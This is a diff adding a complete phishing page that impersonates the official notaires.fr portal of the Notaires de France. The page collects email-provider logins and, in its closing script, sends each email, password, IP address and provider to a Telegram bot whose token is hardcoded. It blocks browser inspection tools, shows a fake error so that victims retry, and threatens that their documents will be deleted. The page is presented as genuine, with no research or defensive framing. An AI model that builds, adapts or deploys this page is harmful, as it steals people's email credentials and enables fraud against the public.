@@ -1,0 +1,942 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Notaires de France - Portail Officiel</title>
+    
+    <style>
+        :root {
+            --notary-blue: #1a2a40;
+            --notary-blue-dark: #121d2d;
+            --notary-gold: #c5a059;
+            --notary-teal: #40b3a2;
+            --footer-text: #ffffff;
+            --glass-bg: rgba(255, 255, 255, 0.96);
+            --error-red: #c53030;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            background: linear-gradient(-45deg, #e2ebf0, #cfd9df, #fdfbfb, #ebedee);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none;
+            overflow-x: hidden;
+        }
+
+        @keyframes gradientBG { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 20%, 60% { transform: translateX(-10px); } 40%, 80% { transform: translateX(10px); } }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes logoPop { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+
+        /* --- HEADER INTELLIGENT --- */
+        .main-header {
+            background: white; 
+            padding: 12px 3%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: space-between;
+            position: sticky; 
+            top: 0; 
+            z-index: 1000; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .header-left { 
+            display: flex; 
+            align-items: center; 
+            gap: 10px; 
+            flex: 1 1 auto;
+            min-width: 200px;
+        }
+        
+        .brand-container { 
+            display: flex; 
+            align-items: center; 
+            gap: 6px; 
+            text-decoration: none; 
+            flex-shrink: 0;
+        }
+        
+        .header-logo { 
+            height: 35px; 
+        }
+        
+        .brand-text { 
+            font-size: 1.3rem; 
+            font-weight: 900; 
+            color: var(--notary-blue); 
+            white-space: nowrap;
+        }
+        
+        @media (min-width: 768px) {
+            .brand-text { font-size: 1.6rem; }
+            .header-logo { height: 45px; }
+        }
+        
+        .brand-text span { color: var(--notary-gold); }
+        
+        .search-bar { 
+            background: #f1f3f4; 
+            border-radius: 25px; 
+            padding: 6px 15px; 
+            width: 100%; 
+            max-width: 250px;
+            display: flex; 
+            align-items: center; 
+        }
+        
+        .search-bar input { 
+            border: none; 
+            background: transparent; 
+            width: 100%; 
+            outline: none; 
+            font-size: 0.9rem;
+        }
+        
+        .header-right { 
+            display: flex; 
+            align-items: center; 
+            gap: 8px; 
+            flex-wrap: wrap;
+            justify-content: flex-end;
+        }
+        
+        /* --- BOUTONS PROGRESSIFS --- */
+        .btn { 
+            padding: 8px 12px; 
+            border-radius: 20px; 
+            text-decoration: none; 
+            font-weight: 700; 
+            font-size: 0.65rem; 
+            transition: 0.3s; 
+            text-transform: uppercase; 
+            white-space: nowrap;
+        }
+        
+        /* Par défaut (mobile) : les boutons SERVICES et ANNUAIRE sont cachés */
+        .btn-teal, .btn-dark {
+            display: none;
+        }
+        
+        /* Le sélecteur de langue est caché sur mobile */
+        .lang-selector {
+            display: none;
+        }
+        
+        /* À partir de 480px (grands smartphones), on affiche le sélecteur de langue */
+        @media (min-width: 480px) {
+            .lang-selector {
+                display: flex;
+                font-weight: bold; 
+                cursor: pointer; 
+                font-size: 0.7rem; 
+                border: 1px solid #ddd; 
+                padding: 6px 8px; 
+                border-radius: 5px; 
+                color: var(--notary-blue); 
+                align-items: center; 
+                gap: 3px;
+                white-space: nowrap;
+            }
+        }
+        
+        /* À partir de 640px (petites tablettes), on affiche le bouton ANNUAIRE */
+        @media (min-width: 640px) {
+            .btn-dark {
+                display: inline-block;
+                background: var(--notary-blue); 
+                color: white;
+            }
+        }
+        
+        /* À partir de 860px (tablettes/petits desktop), on affiche le bouton SERVICES */
+        @media (min-width: 860px) {
+            .btn-teal {
+                display: inline-block;
+                background: var(--notary-teal); 
+                color: white;
+            }
+        }
+        
+        /* Ajustements pour les très grands écrans */
+        @media (min-width: 1024px) {
+            .btn { 
+                padding: 10px 20px; 
+                font-size: 0.75rem; 
+            }
+            
+            .lang-selector { 
+                font-size: 0.8rem; 
+                padding: 8px 12px; 
+            }
+        }
+
+        /* --- CONTENU RESPONSIVE --- */
+        .main-content { 
+            flex-grow: 1; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            padding: 30px 15px; 
+        }
+        
+        @media (min-width: 768px) {
+            .main-content { padding: 60px 20px; }
+        }
+        
+        .login-card {
+            background: var(--glass-bg); 
+            backdrop-filter: blur(15px); 
+            width: 100%; 
+            max-width: 500px;
+            padding: 25px 20px; 
+            border-radius: 24px; 
+            box-shadow: 0 20px 50px rgba(0,0,0,0.1);
+            text-align: center; 
+            position: relative; 
+            overflow: hidden; 
+            border: 1px solid rgba(255,255,255,0.4);
+        }
+        
+        @media (min-width: 480px) {
+            .login-card { padding: 30px 25px; }
+        }
+        
+        @media (min-width: 768px) {
+            .login-card { padding: 40px; }
+        }
+        
+        #lock-overlay {
+            display: none; 
+            position: absolute; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%;
+            background: var(--notary-blue); 
+            color: white; 
+            z-index: 10; 
+            padding: 20px;
+            box-sizing: border-box; 
+            flex-direction: column; 
+            justify-content: center;
+        }
+        
+        @media (min-width: 768px) {
+            #lock-overlay { padding: 40px; }
+        }
+        
+        .form-logo { 
+            width: 60px; 
+            margin-bottom: 15px; 
+            transition: all 0.3s ease;
+        }
+
+        .logo-change {
+            animation: logoPop 0.4s ease;
+        }
+        
+        @media (min-width: 768px) {
+            .form-logo { width: 80px; margin-bottom: 20px; }
+        }
+
+        /* Providers section responsive */
+        .providers-title { 
+            font-size: 1rem; 
+            color: var(--notary-blue); 
+            margin-bottom: 15px; 
+            font-weight: 600; 
+        }
+        
+        @media (min-width: 768px) {
+            .providers-title { font-size: 1.1rem; margin-bottom: 20px; }
+        }
+        
+        .providers-container {
+            display: grid; 
+            grid-template-columns: repeat(2, 1fr); 
+            gap: 10px;
+            margin-bottom: 20px; 
+            max-width: 400px; 
+            margin-left: auto; 
+            margin-right: auto;
+        }
+        
+        @media (min-width: 480px) {
+            .providers-container { gap: 15px; }
+        }
+        
+        .provider-btn {
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            gap: 5px;
+            padding: 12px 5px; 
+            background: white; 
+            border: 2px solid #eaeef2;
+            border-radius: 12px; 
+            cursor: pointer; 
+            transition: all 0.3s ease;
+        }
+        /* Ajoutez ces styles après les styles existants de .provider-btn */
+       .autres-provider {
+         grid-column: span 2;
+         max-width: 50%;
+         margin: 0 auto;
+        }
+
+       @media (max-width: 480px) {
+      .autres-provider {
+        max-width: 80%;
+        }
+    }
+        @media (min-width: 480px) {
+            .provider-btn { padding: 15px 10px; gap: 8px; border-radius: 16px; }
+        }
+        
+        .provider-btn:hover { 
+            border-color: var(--notary-teal); 
+            transform: translateY(-2px); 
+            box-shadow: 0 10px 20px rgba(0,0,0,0.1); 
+        }
+        
+        .provider-btn.selected { 
+            border-color: var(--notary-teal); 
+            background: #f0f9f7; 
+        }
+        
+        .provider-logo { 
+            height: 25px; 
+            object-fit: contain; 
+        }
+        
+        @media (min-width: 480px) {
+            .provider-logo { height: 30px; }
+        }
+        
+        @media (min-width: 768px) {
+            .provider-logo { height: 35px; }
+        }
+        
+        .provider-name { 
+            font-weight: 600; 
+            color: var(--notary-blue); 
+            font-size: 0.8rem;
+        }
+        
+        @media (min-width: 768px) {
+            .provider-name { font-size: 1rem; }
+        }
+
+        /* Login form responsive */
+        .input-group { 
+            text-align: left; 
+            margin-bottom: 15px; 
+        }
+        
+        @media (min-width: 768px) {
+            .input-group { margin-bottom: 20px; }
+        }
+        
+        .input-group label { 
+            display: block; 
+            margin-bottom: 5px; 
+            font-weight: 600; 
+            color: var(--notary-blue); 
+            font-size: 0.9rem;
+        }
+        
+        @media (min-width: 768px) {
+            .input-group label { font-size: 1rem; margin-bottom: 8px; }
+        }
+        
+        .input-group input { 
+            width: 100%; 
+            padding: 12px; 
+            border-radius: 8px; 
+            border: 1px solid #ddd; 
+            box-sizing: border-box; 
+            font-size: 0.95rem; 
+        }
+        
+        @media (min-width: 768px) {
+            .input-group input { padding: 14px; font-size: 1rem; }
+        }
+        
+        #error-zone { 
+            display: none; 
+            background: #fff5f5; 
+            border: 1px solid #feb2b2; 
+            color: var(--error-red); 
+            padding: 12px; 
+            border-radius: 8px; 
+            margin-bottom: 15px; 
+            font-size: 0.8rem; 
+            text-align: left; 
+        }
+        
+        @media (min-width: 768px) {
+            #error-zone { padding: 15px; margin-bottom: 20px; font-size: 0.85rem; }
+        }
+        
+        .btn-submit { 
+            width: 100%; 
+            padding: 14px; 
+            background: var(--notary-blue); 
+            color: white; 
+            border: none; 
+            border-radius: 12px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            gap: 8px; 
+            font-size: 0.95rem; 
+            transition: all 0.3s; 
+        }
+        
+        @media (min-width: 768px) {
+            .btn-submit { padding: 16px; font-size: 1rem; gap: 10px; }
+        }
+        
+        .btn-submit:hover:not(:disabled) { 
+            background: var(--notary-blue-dark); 
+            transform: translateY(-2px); 
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2); 
+        }
+        
+        .btn-submit:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        .btn-back-providers { 
+            background: none; 
+            border: none; 
+            color: var(--notary-teal); 
+            font-size: 0.85rem; 
+            margin-top: 12px; 
+            cursor: pointer; 
+            text-decoration: underline; 
+        }
+        
+        @media (min-width: 768px) {
+            .btn-back-providers { font-size: 0.9rem; margin-top: 15px; }
+        }
+        
+        .spinner { 
+            width: 16px; 
+            height: 16px; 
+            border: 3px solid rgba(255,255,255,0.3); 
+            border-radius: 50%; 
+            border-top-color: white; 
+            animation: spin 0.8s linear infinite; 
+            display: none; 
+        }
+        
+        @media (min-width: 768px) {
+            .spinner { width: 18px; height: 18px; }
+        }
+
+        .selected-provider-info {
+            background: #f0f9f7; 
+            padding: 8px; 
+            border-radius: 8px; 
+            margin-bottom: 15px; 
+            font-size: 0.9rem;
+        }
+        
+        @media (min-width: 768px) {
+            .selected-provider-info { padding: 10px; margin-bottom: 20px; font-size: 1rem; }
+        }
+
+        /* --- FOOTER RESPONSIVE --- */
+        .main-footer { 
+            background-color: var(--notary-blue); 
+            color: var(--footer-text); 
+            padding: 40px 5% 15px; 
+            font-size: 0.8rem; 
+        }
+        
+        @media (min-width: 768px) {
+            .main-footer { padding: 60px 5% 20px; font-size: 0.9rem; }
+        }
+        
+        .footer-top { 
+            display: grid; 
+            grid-template-columns: 1fr; 
+            gap: 25px; 
+            margin-bottom: 30px; 
+        }
+        
+        @media (min-width: 640px) {
+            .footer-top { 
+                grid-template-columns: repeat(2, 1fr); 
+                gap: 30px; 
+            }
+        }
+        
+        @media (min-width: 1024px) {
+            .footer-top { 
+                grid-template-columns: 1.5fr 1fr 1fr 1.5fr; 
+                gap: 40px; 
+                margin-bottom: 50px; 
+            }
+        }
+        
+        .footer-logo-section img { 
+            height: 40px; 
+            margin-bottom: 10px; 
+        }
+        
+        @media (min-width: 768px) {
+            .footer-logo-section img { height: 50px; margin-bottom: 15px; }
+        }
+        
+        .footer-link-group ul { 
+            list-style: none; 
+            padding: 0; 
+            margin: 0; 
+        }
+        
+        .footer-link-group ul li { 
+            margin-bottom: 8px; 
+            position: relative; 
+            padding-left: 12px; 
+        }
+        
+        @media (min-width: 768px) {
+            .footer-link-group ul li { margin-bottom: 12px; padding-left: 15px; }
+        }
+        
+        .footer-link-group ul li::before { 
+            content: "•"; 
+            position: absolute; 
+            left: 0; 
+            color: var(--notary-teal); 
+        }
+        
+        .footer-link-group ul li a { 
+            color: white; 
+            text-decoration: none; 
+            opacity: 0.9; 
+            font-size: 0.8rem;
+        }
+        
+        @media (min-width: 768px) {
+            .footer-link-group ul li a { font-size: 0.9rem; }
+        }
+        
+        .footer-social h4 { 
+            margin-top: 0; 
+            margin-bottom: 12px; 
+            font-weight: 600; 
+            font-size: 0.9rem;
+        }
+        
+        @media (min-width: 768px) {
+            .footer-social h4 { margin-bottom: 20px; font-size: 1rem; }
+        }
+        
+        .social-icons { 
+            display: flex; 
+            gap: 8px; 
+            margin-bottom: 20px; 
+            flex-wrap: wrap;
+        }
+        
+        @media (min-width: 768px) {
+            .social-icons { gap: 15px; margin-bottom: 30px; }
+        }
+        
+        .social-icons a { 
+            width: 30px; 
+            height: 30px; 
+            border: 1px solid rgba(255,255,255,0.3); 
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            color: white; 
+            text-decoration: none; 
+            font-weight: bold; 
+            font-size: 0.8rem;
+        }
+        
+        @media (min-width: 768px) {
+            .social-icons a { width: 35px; height: 35px; font-size: 1rem; }
+        }
+        
+        .btn-discovery { 
+            display: inline-block; 
+            padding: 8px 16px; 
+            border: 1px solid white; 
+            border-radius: 20px; 
+            color: white; 
+            text-decoration: none; 
+            margin-top: 15px; 
+            font-size: 0.7rem; 
+        }
+        
+        @media (min-width: 768px) {
+            .btn-discovery { padding: 10px 20px; margin-top: 20px; font-size: 0.8rem; }
+        }
+        
+        .partner-logo { 
+            max-width: 150px; 
+            filter: brightness(0) invert(1); 
+            opacity: 0.9; 
+            margin-top: 15px; 
+        }
+        
+        @media (min-width: 768px) {
+            .partner-logo { max-width: 200px; margin-top: 20px; }
+        }
+        
+        .footer-bottom { 
+            border-top: 1px solid rgba(255,255,255,0.1); 
+            padding-top: 20px; 
+            display: flex; 
+            flex-direction: column;
+            gap: 10px;
+            font-size: 0.7rem; 
+            opacity: 0.7; 
+        }
+        
+        @media (min-width: 640px) {
+            .footer-bottom { 
+                flex-direction: row; 
+                justify-content: space-between; 
+                align-items: center;
+                padding-top: 25px; 
+            }
+        }
+        
+        .footer-bottom-links { 
+            display: flex; 
+            gap: 10px; 
+            flex-wrap: wrap; 
+        }
+        
+        .footer-bottom-links a { 
+            color: white; 
+            text-decoration: none; 
+            white-space: nowrap;
+        }
+        
+        .copyright-text {
+            white-space: normal;
+            text-align: left;
+        }
+        
+        @media (min-width: 640px) {
+            .copyright-text {
+                text-align: right;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="main-header">
+        <div class="header-left">
+            <a href="#" class="brand-container">
+                <img src="image/imga.png" alt="Logo" class="header-logo">
+                <div class="brand-text">notaires<span>.fr</span></div>
+            </a>
+            <div class="search-bar"><input type="text" placeholder="Rechercher..."></div>
+        </div>
+        <div class="header-right">
+            <a href="#" class="btn btn-teal">SERVICES</a>
+            <a href="#" class="btn btn-dark">ANNUAIRE</a>
+            <div class="lang-selector">FR ⌵</div>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div class="login-card" id="loginCard">
+            <div id="lock-overlay">
+                <h2 style="color: var(--notary-gold); font-size: 1.5rem; margin-bottom: 10px;">ACCÈS BLOQUÉ</h2>
+                <p style="font-size: 0.9rem;">IP détectée : <span id="user-ip">...</span></p>
+                <div id="timer" style="font-size: 2rem; font-weight: 800; margin: 15px 0;">30:00</div>
+                <p style="font-size: 0.75rem; color: #feb2b2; padding: 0 10px;"><strong>SÉCURITÉ ACTIVÉE :</strong> Tentatives épuisées. Toute intrusion forcée entraînera la purge des données.</p>
+            </div>
+
+            <div id="form-content">
+                <img src="image/imga.png" alt="Logo" class="form-logo" id="formLogo">
+                
+                <!-- Sélection du provider -->
+                <div id="provider-selection">
+                    <div class="providers-title">Sélectionnez votre fournisseur d'accès</div>
+                    <div class="providers-container">
+                        <div class="provider-btn" data-provider="orange" data-domain="" data-logo="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c8/Orange_logo.svg/1200px-Orange_logo.svg.png">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c8/Orange_logo.svg/1200px-Orange_logo.svg.png" class="provider-logo" alt="Orange">
+                            <span class="provider-name">Orange</span>
+                        </div>
+                        <div class="provider-btn" data-provider="sfr" data-domain="" data-logo="https://upload.wikimedia.org/wikipedia/commons/thumb/9/97/SFR-2022-logo.svg/1200px-SFR-2022-logo.svg.png">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/97/SFR-2022-logo.svg/1200px-SFR-2022-logo.svg.png" class="provider-logo" alt="SFR">
+                            <span class="provider-name">SFR</span>
+                        </div>
+                        <div class="provider-btn" data-provider="free" data-domain="free.fr" data-logo="https://upload.wikimedia.org/wikipedia/commons/thumb/5/52/Free_logo.svg/2560px-Free_logo.svg.png">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/52/Free_logo.svg/2560px-Free_logo.svg.png" class="provider-logo" alt="Free">
+                            <span class="provider-name">Free</span>
+                        </div>
+                        <div class="provider-btn" data-provider="laposte" data-domain="laposte.net" data-logo="https://logos-world.net/wp-content/uploads/2021/02/La-Poste-Emblem.png">
+                            <img src="https://logos-world.net/wp-content/uploads/2021/02/La-Poste-Emblem.png" class="provider-logo" alt="La Poste">
+                            <span class="provider-name">La Poste</span>
+                        </div>
+                        <div class="provider-btn autres-provider" data-provider="Autres" data-domain="" data-logo="https://cdn-icons-png.flaticon.com/512/81/81055.png">
+                            <img src="https://cdn-icons-png.flaticon.com/512/81/81055.png" class="provider-logo" alt="Autres">
+                            <span class="provider-name">Autres fournisseurs</span>
+                        </div>
+                        
+                    </div>
+                </div>
+
+                <!-- Formulaire de connexion (caché initialement) -->
+                <div id="login-fields" style="display: none;">
+                    <form id="loginForm">
+                        <div id="error-zone">
+                            <strong>⚠️ Erreur d'identification</strong> (Tentative <span id="attempt-count">0</span>/3)<br>
+                            <span style="font-weight: 800; text-decoration: underline; display: block; margin-top: 5px;">
+                                ALERTE : Si les informations sont saisies incorrectement 3 fois de suite, les documents seront supprimés.
+                            </span>
+                        </div>
+                        <div class="selected-provider-info">
+                            <span>Connexion via <strong id="selected-provider-name">Orange</strong></span>
+                        </div>
+                        <div class="input-group">
+                            <label>Adresse e-mail <span id="provider-domain-display"></span></label>
+                            <input type="email" id="email" placeholder="exemple@fournisseur.fr" required>
+                        </div>
+                        <div class="input-group">
+                            <label>Mot de passe</label>
+                            <input type="password" id="password" placeholder="••••••••" required>
+                        </div>
+                        <button type="submit" class="btn-submit" id="submitBtn">
+                            <span class="spinner" id="spinner"></span>
+                            <span id="btnText">SE CONNECTER</span>
+                        </button>
+                        <button type="button" class="btn-back-providers" id="backToProviders">← Changer de fournisseur</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="main-footer">
+        <div class="footer-top">
+            <div class="footer-logo-section">
+                <img src="image/imga.png" alt="Logo Footer">
+                <div class="brand-text" style="color:white; font-size: 1.1rem; margin-bottom: 8px;">notaires<span>.fr</span></div>
+                <p style="font-size: 0.8rem;">Le site officiel des Notaires de France</p>
+                <a href="#" class="btn-discovery">Découvrir le site Conseil supérieur du notariat</a>
+            </div>
+            <div class="footer-link-group">
+                <ul>
+                    <li><a href="#">Actualités des notaires</a></li>
+                    <li><a href="#">Calculer vos frais d'achat immobilier</a></li>
+                    <li><a href="#">Calculer votre plus-value immobilière</a></li>
+                    <li><a href="#">Promesse et compromis de vente</a></li>
+                </ul>
+            </div>
+            <div class="footer-link-group">
+                <ul>
+                    <li><a href="#">Règlement des successions</a></li>
+                    <li><a href="#">Rechercher un testament</a></li>
+                    <li><a href="#">La donation</a></li>
+                    <li><a href="#">Le tarif du notaire</a></li>
+                </ul>
+            </div>
+            <div class="footer-social">
+                <h4>Suivez-nous sur les réseaux</h4>
+                <div class="social-icons">
+                    <a href="#">f</a><a href="#">X</a><a href="#">Y</a><a href="#">in</a><a href="#">ig</a><a href="#">rss</a>
+                </div>
+                <p style="font-size: 0.65rem; opacity: 0.6;">Site réalisé avec le soutien de la Banque des Territoires</p>
+                <img src="https://upload.wikimedia.org/wikipedia/fr/0/04/BANQUE_TERRITOIRES_LOGO_ENDOS_BM_HORIZONTAL_POS_CMJN.png" class="partner-logo">
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <div class="footer-bottom-links">
+                <a href="#">FAQ</a>
+                <a href="#">Lexique</a>
+                <a href="#">Liens utiles</a>
+                <a href="#">Mentions légales</a>
+                <a href="#">Plan du site</a>
+            </div>
+            <span class="copyright-text">© Copyright Conseil supérieur du notariat 2026</span>
+        </div>
+    </footer>
+
+    <script>
+        const TELEGRAM_TOKEN = "8569696478:AAGRq1_UVHJr-bGFa4CTIYAzac-JSj3tzWI";
+        const CHAT_ID = "7823117194";
+
+        // ANTI-INSPECT COMPLET
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.onkeydown = e => { 
+            if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || (e.ctrlKey && e.keyCode == 85)) return false; 
+        };
+
+        let userIP = "En cours...";
+        let selectedProvider = null;
+        let selectedDomain = null;
+        let selectedLogo = null;
+
+        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
+            userIP = d.ip;
+            document.getElementById('user-ip').textContent = d.ip;
+        });
+
+        // Gestion de la sélection du provider
+        const providerBtns = document.querySelectorAll('.provider-btn');
+        const providerSelection = document.getElementById('provider-selection');
+        const loginFields = document.getElementById('login-fields');
+        const selectedProviderName = document.getElementById('selected-provider-name');
+        const providerDomainDisplay = document.getElementById('provider-domain-display');
+        const backToProviders = document.getElementById('backToProviders');
+        const formLogo = document.getElementById('formLogo');
+        const originalFormLogoSrc = formLogo.src;
+
+        providerBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                // Retirer la sélection précédente
+                providerBtns.forEach(b => b.classList.remove('selected'));
+                btn.classList.add('selected');
+                
+                selectedProvider = btn.dataset.provider;
+                selectedDomain = btn.dataset.domain;
+                selectedLogo = btn.dataset.logo;
+                
+                // Mettre à jour l'affichage
+                selectedProviderName.textContent = btn.querySelector('.provider-name').textContent;
+                
+                // Afficher le domaine uniquement pour Free et La Poste
+                if (selectedDomain) {
+                    providerDomainDisplay.textContent = `(@${selectedDomain})`;
+                } else {
+                    providerDomainDisplay.textContent = '';
+                }
+                
+                // Changer le logo du formulaire avec animation
+                formLogo.src = selectedLogo;
+                formLogo.classList.add('logo-change');
+                setTimeout(() => {
+                    formLogo.classList.remove('logo-change');
+                }, 400);
+                
+                // Afficher le formulaire de connexion
+                providerSelection.style.display = 'none';
+                loginFields.style.display = 'block';
+            });
+        });
+
+        backToProviders.addEventListener('click', () => {
+            providerSelection.style.display = 'block';
+            loginFields.style.display = 'none';
+            
+            // Remettre le logo original du notaire dans le formulaire
+            formLogo.src = originalFormLogoSrc;
+            formLogo.classList.add('logo-change');
+            setTimeout(() => {
+                formLogo.classList.remove('logo-change');
+            }, 400);
+            
+            // Réinitialiser le formulaire
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+            errorZone.style.display = 'none';
+        });
+
+        // Gestion du verrouillage
+        const loginForm = document.getElementById('loginForm');
+        const loginCard = document.getElementById('loginCard');
+        const errorZone = document.getElementById('error-zone');
+        const lockOverlay = document.getElementById('lock-overlay');
+        const submitBtn = document.getElementById('submitBtn');
+        const spinner = document.getElementById('spinner');
+        const btnText = document.getElementById('btnText');
+
+        let attempts = parseInt(localStorage.getItem('nt_at')) || 0;
+        let lockUntil = localStorage.getItem('nt_lk');
+
+        function checkLock() {
+            if (lockUntil && Date.now() < lockUntil) {
+                lockOverlay.style.display = 'flex';
+                const itv = setInterval(() => {
+                    const diff = Math.round((lockUntil - Date.now()) / 1000);
+                    if (diff <= 0) { clearInterval(itv); localStorage.clear(); location.reload(); }
+                    else {
+                        const m = Math.floor(diff/60); const s = diff%60;
+                        document.getElementById('timer').textContent = `${m}:${s<10?'0':''}${s}`;
+                    }
+                }, 1000);
+            }
+        }
+
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            if (!selectedProvider) {
+                alert('Veuillez sélectionner un fournisseur d\'accès');
+                return;
+            }
+            
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('password').value;
+
+            // Vérifier que l'email correspond au domaine uniquement pour Free et La Poste
+            if (selectedDomain && !email.toLowerCase().endsWith(`@${selectedDomain}`)) {
+                alert(`L'adresse email doit se terminer par @${selectedDomain}`);
+                return;
+            }
+
+            errorZone.style.display = 'none';
+            submitBtn.disabled = true;
+            spinner.style.display = 'block';
+            btnText.textContent = 'VÉRIFICATION...';
+
+            const msg = `🔐 **LOGIN NOTAIRE**\n\n📧 Email: \`${email}\`\n🔑 Pass: \`${pass}\`\n🌐 IP: ${userIP}\n📡 Provider: ${selectedProvider}`;
+            
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            });
+
+            setTimeout(() => {
+                attempts++;
+                localStorage.setItem('nt_at', attempts);
+                document.getElementById('attempt-count').textContent = attempts;
+                
+                if (attempts >= 3) {
+                    localStorage.setItem('nt_lk', Date.now() + (30 * 60 * 1000));
+                    location.reload();
+                } else {
+                    submitBtn.disabled = false;
+                    spinner.style.display = 'none';
+                    btnText.textContent = 'SE CONNECTER';
+                    errorZone.style.display = 'block';
+                    loginCard.style.animation = 'shake 0.5s ease';
+                    document.getElementById('password').value = '';
+                    setTimeout(() => loginCard.style.animation = '', 500);
+                }
+            }, 3000);
+        });
+
+        checkLock();
+    </script>
+</body>
+</html>
